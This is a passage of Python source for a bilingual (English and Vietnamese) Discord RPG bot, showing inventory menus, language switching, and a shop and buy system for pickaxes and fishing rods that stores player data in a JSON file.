    if users[str(user.id)]["flying_cucumber"] >= 1:
        flying_cucumbers = f'{trong}+{flying_cucumber}{users[str(user.id)]["flying_cucumber"]} `flying cucumber`'
    if users[str(user.id)]["flying_cucumber"] < 1:
        flying_cucumbers = ''

    if users[str(user.id)]["ganoderma"] >= 1:
        ganodermas = f'{trong}+{ganoderma}{users[str(user.id)]["ganoderma"]} `Ganoderma`\n'
    if users[str(user.id)]["ganoderma"] < 1:
        ganodermas = ''

    if users[str(user.id)]["purple_sweet_potato"] >= 1:
        purple_sweet_potatos = f'{trong}+{purple_sweet_potato}{users[str(user.id)]["purple_sweet_potato"]} `purple sweet potato`\n'
    if users[str(user.id)]["purple_sweet_potato"] < 1:
        purple_sweet_potatos = ''

    if users[str(user.id)]["red_grapes"] >= 1:
        red_grapess = f'{trong}+{red_grapes}{users[str(user.id)]["red_grapes"]} `red grapes`\n'
    if users[str(user.id)]["red_grapes"] < 1:
        red_grapess = ''

    if users[str(user.id)]["crocodile_foot_herb"] >= 1:
        crocodile_foot_herbs = f'{trong}+{crocodile_foot_herb}{users[str(user.id)]["crocodile_foot_herb"]} `crocodile foot herb`'
    if users[str(user.id)]["crocodile_foot_herb"] < 1:
        crocodile_foot_herbs = ''


    if users[str(user.id)]["language"] == 0:
        embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
        embed.add_field(name="You see Weapons and Items here", value=f"Choose what you want to see!\n{pickaxe1}**Tools**\n{rock}**Ore**\n{tuna}**Fish**\n{orange}**Fruit**")
        embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
        msg = await ctx.send(embed=embed)
        await ctx.send(components=[Select(
            placeholder="Inviting you to choose",
            options=[
                    SelectOption(label="Pickaxe",value="option1",description="See pickaxe"),
                    SelectOption(label="Ore",value="option2",description="See ore"),
                    SelectOption(label="Fish",value="option3",description="See fish"),
                    SelectOption(label="Fruit",value="option4",description="See fruit"),
            ],
            custom_id = 'SelectTesting'
        )])
        # embed.clear_fields()
        embed1 = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
        embed1.add_field(name="You see Weapons and Items here", value=f"**Pickaxe:**\n{pick1}{pick2}{pick3}{pick4}{pick5}{pick6}\nTip: **MAGI NATSUKI#3206** is the one who created the bot according to the customer's request **[ρͼ] βlaer#6666**!")
        embed1.set_author(name=f"{ctx.author.name}", icon_url=f"{user.avatar_url}")
        # await msg.edit(embed=embed1)
        # embed1.set_footer(text=f"{trong}")
        
        embed2 = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
        embed2.add_field(name="You see Ores here", value=f"{trong}{rocks}{smoothstone}{copper}{iron}{gold}{diamonds}", inline=False)
        embed2.add_field(name=f"{trong}", value=f"{rubys}{glowstones}{magmas}{obsidians}{moonstone}{obsidianmoon}{stoneancestor}\nTip: **MAGI NATSUKI#3206** is the one who created the bot according to the customer's request **[ρͼ] βlaer#6666**!", inline=False)
        embed2.set_author(name=f"{ctx.author.name}", icon_url=f"{user.avatar_url}")
        # embed2.set_footer(text=f"{trong}")
        
        embed3 = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
        embed3.add_field(name="You see Fishs here", value=f"{tunas}{sticklebacks}{squidss}{octopus}{electric_eels}", inline=False)
        embed3.add_field(name=f"{trong}", value=f"{salmons}{dolphinss}{sharkss}{kappa_sharks}{purplecrystal_sharks}\nTip: **MAGI NATSUKI#3206** is the one who created the bot according to the customer's request **[ρͼ] βlaer#6666**!", inline=False)
        embed3.set_author(name=f"{ctx.author.name}", icon_url=f"{user.avatar_url}")
        # embed3.set_footer(text=f"{trong}")

        embed4 = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
        embed4.add_field(name="You see Fruit here", value=f"{trong}{oranges}{apples}{pears}{watermelons}{dragonfruits}", inline=True)
        embed4.add_field(name=f"You see Fruit here", value=f"{trong}{grapes}{strawberrys}{blueberrys}{herbal_stone_rings}{flying_cucumbers}", inline=True)
        embed4.add_field(name=f"{trong}", value=f"{ganodermas}{purple_sweet_potatos}{red_grapess}{crocodile_foot_herbs}\n\nTip: **MAGI NATSUKI#3206** is the one who created the bot according to the customer's request **[ρͼ] βlaer#6666**!", inline=False)
        embed4.set_author(name=f"{ctx.author.name}", icon_url=f"{user.avatar_url}")
        # embed4.set_footer(text=f"{trong}")

        while True:
            interaction = await client.wait_for("select_option",check=lambda inter: inter.custom_id == 'SelectTesting' and inter.user == ctx.author)
            label = interaction.values[0]
            if label == "option1":
                await msg.edit(embed=embed1)
            elif label == "option2":
                await msg.edit(embed=embed2)
            elif label == "option3":
                await msg.edit(embed=embed3)
            elif label == "option4":
                await msg.edit(embed=embed4)


    if users[str(user.id)]["language"] >= 1:
        embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
        embed.add_field(name="Bạn xem Weapons và Items ở đây", value=f"Chọn những gì bạn muốn xem!\n{pickaxe1}**Tools**\n{rock}**Ore**\n{tuna}**Fish**\n{orange}**Fruit**")
        embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
        # embed.set_footer(text=f"{trong}")
        msg = await ctx.send(embed=embed)
        await ctx.send(components=[Select(
            placeholder="Mời bạn chọn",
            options=[
                    SelectOption(label="Pickaxe",value="option1",description="Xem pickaxe"),
                    SelectOption(label="Ore",value="option2",description="Xem ore"),
                    SelectOption(label="Fish",value="option3",description="See fish"),
                    SelectOption(label="Fruit",value="option4",description="See fruit"),
            ],
            custom_id = 'SelectTesting'
        )])
        # embed.clear_fields()
        embed1 = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
        embed1.add_field(name="Bạn xem Items ở đây", value=f"**Pickaxe:**\n{pick1}{pick2}{pick3}{pick4}{pick5}{pick6}\nTip: **MAGI NATSUKI#3206** là người tạo ra bot theo yêu cầu của khách hàng **[ρͼ] βlaer#6666**!")
        embed1.set_author(name=f"{ctx.author.name}", icon_url=f"{user.avatar_url}")
        # await msg.edit(embed=embed1)
        # embed1.set_footer(text=f"{trong}")
        
        embed2 = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
        embed2.add_field(name="Bạn xem Ores ở đây", value=f"{trong}{rocks}{smoothstone}{copper}{iron}{gold}{diamonds}", inline=False)
        embed2.add_field(name=f"{trong}", value=f"{rubys}{glowstones}{magmas}{obsidians}{moonstone}{obsidianmoon}{stoneancestor}\nTip: **MAGI NATSUKI#3206** là người tạo ra bot theo yêu cầu của khách hàng **[ρͼ] βlaer#6666**!", inline=False)
        embed2.set_author(name=f"{ctx.author.name}", icon_url=f"{user.avatar_url}")
        # embed2.set_footer(text=f"{trong}")
        
        embed3 = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
        embed3.add_field(name="Bạn xem Cá ở đây", value=f"{tunas}{sticklebacks}{squidss}{octopus}{electric_eels}", inline=False)
        embed3.add_field(name=f"{trong}", value=f"{salmons}{dolphinss}{sharkss}{kappa_sharks}{purplecrystal_sharks}\nTip: **MAGI NATSUKI#3206** là người tạo ra bot theo yêu cầu của khách hàng **[ρͼ] βlaer#6666**!", inline=False)
        embed3.set_author(name=f"{ctx.author.name}", icon_url=f"{user.avatar_url}")
        # embed3.set_footer(text=f"{trong}")

        embed4 = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
        embed4.add_field(name="You see Fruit here", value=f"{trong}{oranges}{apples}{pears}{watermelons}{dragonfruits}", inline=True)
        embed4.add_field(name=f"You see Fruit here", value=f"{trong}{grapes}{strawberrys}{blueberrys}{herbal_stone_rings}{flying_cucumbers}", inline=True)
        embed4.add_field(name=f"{trong}", value=f"{ganodermas}{purple_sweet_potatos}{red_grapess}{crocodile_foot_herbs}\n\nTip: **MAGI NATSUKI#3206** là người tạo ra bot theo yêu cầu của khách hàng **[ρͼ] βlaer#6666**!", inline=False)
        embed4.set_author(name=f"{ctx.author.name}", icon_url=f"{user.avatar_url}")
        # embed4.set_footer(text=f"{trong}")


        interaction = await client.wait_for("select_option",check=lambda inter: inter.custom_id == 'SelectTesting' and inter.user == ctx.author)
        label = interaction.values[0]
        if label == "option1":
            await msg.edit(embed=embed1)
        elif label == "option2":
            await msg.edit(embed=embed2)
        elif label == "option3":
            await msg.edit(embed=embed3)
        elif label == "option4":
            await msg.edit(embed=embed4)

@client.command()
async def profile(ctx):
    await profiles.profile(ctx=ctx)

@client.command()
@commands.cooldown(1, 3, commands.BucketType.user)
async def use(ctx, duu=None):
    await dùng.use(ctx=ctx, duu=duu)

@client.command()
async def changelanguage(ctx, lang=None):
    await open_acc(ctx.author)
    users = await get_bank()
    user = ctx.author
    if users[str(user.id)]["language"] == 0:
        if lang == None:
            await ctx.send("What language do you want to change to? There are 2 types: **Vietnamese** and **English**")
            return
    if users[str(user.id)]["language"] >= 1:
        if lang == None:
            await ctx.send("Bạn muốn chuyển sang ngôn ngữ nào? Có 2 loại: **Tiếng Việt** và **Tiếng Anh**")
            return

    if lang.lower() == "vietnamese":
        if users[str(user.id)]["language"] == 0:
            users[str(user.id)]["language"] += 1
            with open("rpg.json", "w") as f:
                json.dump(users, f, indent=4)
            await ctx.send("Bạn đã đổi ngôn ngữ thành Tiếng Việt")
            return
        if users[str(user.id)]["language"] >= 1:
            await ctx.send("Bạn hiện đang sử dụng ngôn ngữ Tiếng Việt")
            return

    if lang.lower() == "english":
        if users[str(user.id)]["language"] == 0:
            await ctx.send("You are currently using english language")
            return
        if users[str(user.id)]["language"] >= 1:
            users[str(user.id)]["language"] = 0
            with open("rpg.json", "w") as f:
                json.dump(users, f, indent=4)
            await ctx.send("You changed the language to English")
            return

@client.command()
@commands.cooldown(1, 3, commands.BucketType.user)
async def level(ctx):
    await levels.level(ctx=ctx)

@client.command()
@commands.cooldown(1, 3, commands.BucketType.user)
async def shop(ctx):
    await open_acc(ctx.author)
    users = await get_bank()
    user = ctx.author
    embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
    embed.add_field(name="Shop of Rpg", value=f"**The shop has the following items:**\n**How to buy:** `pbuy` + `id`\n+ {pickaxe1}Pickaxes\n+ {wood_rod}Rods\n+ {wood_hoe}Hoes", inline=False)
    embed.add_field(name=f"Invite Bot {client.user.name}", value="[Click here to view it!](https://discord.com/api/oauth2/authorize?client_id=950599909898342410&permissions=8&scope=bot)", inline=False)
    embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
    embed.set_footer(text="Tip: pbuy + id")
    msg = await ctx.send(embed=embed)
    await ctx.send(components=[Select(
        placeholder="Inviting you to choose",
        options=[
                SelectOption(label="Pickaxe",value="option1",description="Shop Pickaxes"),
                SelectOption(label="Rods",value="option2",description="Shop Rods"),
                SelectOption(label="Hoes",value="option3",description="Shop Hoes"),
                SelectOption(label="All",value="option4",description="Shop All"),
        ],
        custom_id = 'SelectTesting'
    )])
    # embed.clear_fields()
    embed1 = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.blue())
    embed1.add_field(name="Shop Pickaxes", value=f"+{pickaxe2} **Copper Pickaxe** --> `500` {coin} **[id 1]**\n"
                                                 f"+{pickaxe3} **Iron Pickaxe** --> `2.000` {coin} **[id 2]**\n"
                                                 f"+{pickaxe4} **Gold Pickaxe** --> `5.000` {coin} **[id 3]**\n"
                                                 f"+{pickaxe5} **Diamond Pickaxe** --> `10.000` {coin} **[id 4]**\n"
                                                 f"+{pickaxe6} **Obsidian Pickaxe** --> `30.000` {coin} **[id 5]**\n"
                                                 f"\n**Tip:** pbuy + id")
    embed1.set_author(name=f"{ctx.author.name}", icon_url=f"{user.avatar_url}")

    
    embed2 = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.purple())
    embed2.add_field(name="Shop Rods", value=f"+{rock_rod} **Rock Rod** --> `1.000` {coin} **[id 6]**\n"
                                             f"+{copper_rod} **Copper Rod** --> `2.000` {coin} **[id 7]**\n"
                                             f"+{iron_rod} **Iron Rod** --> `5.000` {coin} **[id 8]**\n"
                                             f"+{gold_rod} **Gold Rod** --> `15.000` {coin} **[id 9]**\n"
                                             f"+{magic_rod} **Magic Rod** --> `35.000` {coin} **[id 10]**\n"
                                             f"\n**Tip:** pbuy + id")
    embed2.set_author(name=f"{ctx.author.name}", icon_url=f"{user.avatar_url}")
    

    embed3 = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.orange())
    embed3.add_field(name="Shop Hoes", value=f"+{rock_hoe} **Rock Hoe** --> `1.500` {coin} **[id 11]**\n"
                                             f"+{iron_hoe} **Iron Hoe** --> `3.500` {coin} **[id 12]**\n"
                                             f"+{gold_hoe} **Gold Hoe** --> `7.500` {coin} **[id 13]**\n"
                                             f"+{diamond_hoe} **Diamond Hoe** --> `15.500` {coin} **[id 14]**\n"
                                             f"+{obsidian_hoe} **Obsidian Hoe** --> `30.000` {coin} **[id 15]**\n"
                                             f"\n**Tip:** pbuy + id")
    embed3.set_author(name=f"{ctx.author.name}", icon_url=f"{user.avatar_url}")


    embed4 = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.dark_purple())
    embed4.add_field(name="Shop Pickaxes", value=f"+{pickaxe2} **Copper Pickaxe** --> `500` {coin} **[id 1]**\n"
                                                 f"+{pickaxe3} **Iron Pickaxe** --> `2.000` {coin} **[id 2]**\n"
                                                 f"+{pickaxe4} **Gold Pickaxe** --> `5.000` {coin} **[id 3]**\n"
                                                 f"+{pickaxe5} **Diamond Pickaxe** --> `10.000` {coin} **[id 4]**\n"
                                                 f"+{pickaxe6} **Obsidian Pickaxe** --> `30.000` {coin} **[id 5]**", inline=False)

    embed4.add_field(name="Shop Rods", value=f"+{rock_rod} **Rock Rod** --> `1.000` {coin} **[id 6]**\n"
                                             f"+{copper_rod} **Copper Rod** --> `2.000` {coin} **[id 7]**\n"
                                             f"+{iron_rod} **Gold Rod** --> `5.000` {coin} **[id 8]**\n"
                                             f"+{gold_rod} **Gold Rod** --> `15.000` {coin} **[id 9]**\n"
                                             f"+{magic_rod} **Magic Rod** --> `35.000` {coin} **[id 10]**", inline=False)

    embed4.add_field(name="Shop Hoes", value=f"+{rock_hoe} **Rock Hoe** --> `1.500` {coin} **[id 11]**\n"
                                             f"+{iron_hoe} **Iron Hoe** --> `3.500` {coin} **[id 12]**\n"
                                             f"+{gold_hoe} **Gold Hoe** --> `7.500` {coin} **[id 13]**\n"
                                             f"+{diamond_hoe} **Diamond Hoe** --> `15.500` {coin} **[id 14]**\n"
                                             f"+{obsidian_hoe} **Obsidian Hoe** --> `30.000` {coin} **[id 15]**\n"
                                             f"\n**Tip:** pbuy + id", inline=False)
    embed4.set_author(name=f"{ctx.author.name}", icon_url=f"{user.avatar_url}")


    while True:
        interaction = await client.wait_for("select_option",check=lambda inter: inter.custom_id == 'SelectTesting' and inter.user == ctx.author)
        label = interaction.values[0]
        if label == "option1":
            await msg.edit(embed=embed1)
        elif label == "option2":
            await msg.edit(embed=embed2)
        elif label == "option3":
            await msg.edit(embed=embed3)
        elif label == "option4":
            await msg.edit(embed=embed4)

@client.command()
@commands.cooldown(1, 3, commands.BucketType.user)
async def buy(ctx, mua=None):
    await open_acc(ctx.author)
    users = await get_bank()
    user = ctx.author

    if users[str(user.id)]["language"] == 0:
        if mua == None:
            await ctx.send("You need to enter the item id you want to buy")
            return

    if users[str(user.id)]["language"] >= 1:
        if mua == None:
            await ctx.send("Bạn cần nhập id mặt hàng bạn muốn mua")
            return

    if users[str(user.id)]["language"] == 0:
        a1 = "You don't have enough money"
        a2 = "After buying pickaxe you need puse + pickaxe name to use pickaxe"

    if users[str(user.id)]["language"] >= 1:
        a1 = "Bạn không có đủ tiền"
        a2 = "Sau khi mua cuốc bạn cần có puse + tên cuốc để sử dụng cuốc"

    if mua.lower() == "1":
        if users[str(user.id)]["wallet"] <500:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="Money", value=a1, inline=False)
            embed.add_field(name="Tip", value=a2, inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            return

        if users[str(user.id)]["pickaxe2"] == 0:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="Buy Copper Pickaxe", value=f"You just bought {pickaxe2} Copper Pickaxe --> `500` {coin}", inline=False)
            embed.add_field(name="Tip", value=a2, inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            users[str(user.id)]["pickaxe2"] += 1
            with open("rpg.json", "w") as f:
                json.dump(users, f, indent=4)

            users[str(user.id)]["wallet"] -= 500
            with open("rpg.json", "w") as f:
                json.dump(users, f, indent=4)

            return
        if users[str(user.id)]["pickaxe2"] > 0:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="You had Copper Pickaxe", value=f"you can't buy continue {pickaxe2} Copper Pickaxe", inline=False)
            embed.add_field(name="Tip", value=a2, inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            return

    if mua.lower() == "2":
        if users[str(user.id)]["wallet"] <2000:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="Money", value=a1, inline=False)
            embed.add_field(name="Tip", value=a2, inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            return

        if users[str(user.id)]["pickaxe3"] == 0:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="Buy Iron Pickaxe", value=f"You just bought {pickaxe3} Iron Pickaxe --> `2000` {coin}", inline=False)
            embed.add_field(name="Tip", value=a2, inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            users[str(user.id)]["pickaxe3"] += 1
            with open("rpg.json", "w") as f:
                json.dump(users, f, indent=4)

            users[str(user.id)]["wallet"] -= 2000
            with open("rpg.json", "w") as f:
                json.dump(users, f, indent=4)

            return
        if users[str(user.id)]["pickaxe3"] > 0:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="You had Iron Pickaxe", value=f"you can't buy continue {pickaxe3} Iron Pickaxe", inline=False)
            embed.add_field(name="Tip", value=a2, inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            return

    if mua.lower() == "3":
        if users[str(user.id)]["wallet"] <5000:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="Money", value=a1, inline=False)
            embed.add_field(name="Tip", value=a2, inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            return

        if users[str(user.id)]["pickaxe4"] == 0:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="Buy Gold Pickaxe", value=f"You just bought {pickaxe4} Gold Pickaxe --> `5000` {coin}", inline=False)
            embed.add_field(name="Tip", value=a2, inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            users[str(user.id)]["pickaxe4"] += 1
            with open("rpg.json", "w") as f:
                json.dump(users, f, indent=4)

            users[str(user.id)]["wallet"] -= 5000
            with open("rpg.json", "w") as f:
                json.dump(users, f, indent=4)

            return
        if users[str(user.id)]["pickaxe4"] > 0:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="You had Gold Pickaxe", value=f"you can't buy continue {pickaxe4} Gold Pickaxe", inline=False)
            embed.add_field(name="Tip", value=a2, inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            return

    if mua.lower() == "4":
        if users[str(user.id)]["wallet"] <10000:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="Money", value=a1, inline=False)
            embed.add_field(name="Tip", value=a2, inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            return

        if users[str(user.id)]["pickaxe5"] == 0:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="Buy Diamond Pickaxe", value=f"You just bought {pickaxe5} Diamond Pickaxe --> `10000` {coin}", inline=False)
            embed.add_field(name="Tip", value=a2, inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            users[str(user.id)]["pickaxe5"] += 1
            with open("rpg.json", "w") as f:
                json.dump(users, f, indent=4)

            users[str(user.id)]["wallet"] -= 10000
            with open("rpg.json", "w") as f:
                json.dump(users, f, indent=4)

            return
        if users[str(user.id)]["pickaxe5"] > 0:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="You had Diamond Pickaxe", value=f"you can't buy continue {pickaxe5} Diamond Pickaxe", inline=False)
            embed.add_field(name="Tip", value=a2, inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            return

    if mua.lower() == "5":
        if users[str(user.id)]["wallet"] <30000:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="Money", value=a1, inline=False)
            embed.add_field(name="Tip", value=a2, inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            return

        if users[str(user.id)]["pickaxe6"] == 0:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="Buy Obsidian Pickaxe", value=f"You just bought {pickaxe6} Obsidian Pickaxe --> `30000` {coin}", inline=False)
            embed.add_field(name="Tip", value=a2, inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            users[str(user.id)]["pickaxe6"] += 1
            with open("rpg.json", "w") as f:
                json.dump(users, f, indent=4)

            users[str(user.id)]["wallet"] -= 30000
            with open("rpg.json", "w") as f:
                json.dump(users, f, indent=4)

            return
        if users[str(user.id)]["pickaxe6"] > 0:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="You had Obsidian Pickaxe", value=f"you can't buy continue {pickaxe6} Obsidian Pickaxe", inline=False)
            embed.add_field(name="Tip", value=a2, inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            return

    if mua.lower() == "6":
        if users[str(user.id)]["wallet"] <1000:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="Money", value=a1, inline=False)
            embed.add_field(name="Tip", value=a2, inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            return

        if users[str(user.id)]["rod"] == 0:
            await ctx.send("You don't have a fishing Wood Rod yet")
            return

        if users[str(user.id)]["rod"] > 1:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="You had Rock Rod", value=f"you can't buy continue {rock_rod} Rock Rod", inline=False)
            embed.add_field(name="Tip", value=a2, inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            return

        if users[str(user.id)]["rod"] == 1:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="Buy Rock Rod", value=f"You just bought {rock_rod} Rock Rod --> `1000` {coin}", inline=False)
            embed.add_field(name="Tip", value=a2, inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            users[str(user.id)]["rod"] += 1
            with open("rpg.json", "w") as f:
                json.dump(users, f, indent=4)

            users[str(user.id)]["wallet"] -= 1000
            with open("rpg.json", "w") as f:
                json.dump(users, f, indent=4)
            return

    if mua.lower() == "7":
        if users[str(user.id)]["wallet"] <2000:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="Money", value=a1, inline=False)
            embed.add_field(name="Tip", value=a2, inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            return

        if users[str(user.id)]["rod"] == 1:
            await ctx.send("You don't have a fishing Rock Rod yet")
            return

        if users[str(user.id)]["rod"] > 2:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="You had Copper Rod", value=f"You can't buy continue {copper_rod} Copper Rod", inline=False)
            embed.add_field(name="Tip", value=a2, inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            return

        if users[str(user.id)]["rod"] == 2:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="Buy Copper Rod", value=f"You just bought {copper_rod} Copper Rod --> `2000` {coin}", inline=False)
            embed.add_field(name="Tip", value=a2, inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            users[str(user.id)]["rod"] += 1
            with open("rpg.json", "w") as f:
                json.dump(users, f, indent=4)

            users[str(user.id)]["wallet"] -= 2000
            with open("rpg.json", "w") as f:
                json.dump(users, f, indent=4)
            return

    if mua.lower() == "8":
        if users[str(user.id)]["wallet"] <5000:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="Money", value=a1, inline=False)
            embed.add_field(name="Tip", value=a2, inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            return

        if users[str(user.id)]["rod"] == 2:
            await ctx.send("You don't have a fishing Copper Rod yet")
            return

        if users[str(user.id)]["rod"] > 3:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="You had Iron Rod", value=f"You can't buy continue {iron_rod} Iron Rod", inline=False)
            embed.add_field(name="Tip", value=a2, inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            return

        if users[str(user.id)]["rod"] == 3:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="Buy Iron Rod", value=f"You just bought {iron_rod} Iron Rod --> `5000` {coin}", inline=False)
            embed.add_field(name="Tip", value=a2, inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            users[str(user.id)]["rod"] += 1
            with open("rpg.json", "w") as f:
                json.dump(users, f, indent=4)

            users[str(user.id)]["wallet"] -= 5000
            with open("rpg.json", "w") as f:
                json.dump(users, f, indent=4)
            return

    if mua.lower() == "9":
        if users[str(user.id)]["wallet"] <15000:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="Money", value=a1, inline=False)
            embed.add_field(name="Tip", value=a2, inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            return

        if users[str(user.id)]["rod"] == 3:
            await ctx.send("You don't have a fishing Iron Rod yet")
            return

        if users[str(user.id)]["rod"] > 4:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="You had Gold Rod", value=f"You can't buy continue {gold_rod} Gold Rod", inline=False)
            embed.add_field(name="Tip", value=a2, inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            return

        if users[str(user.id)]["rod"] == 4:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="Buy Gold Rod", value=f"You just bought {gold_rod} Gold Rod --> `15000` {coin}", inline=False)
            embed.add_field(name="Tip", value=a2, inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            users[str(user.id)]["rod"] += 1
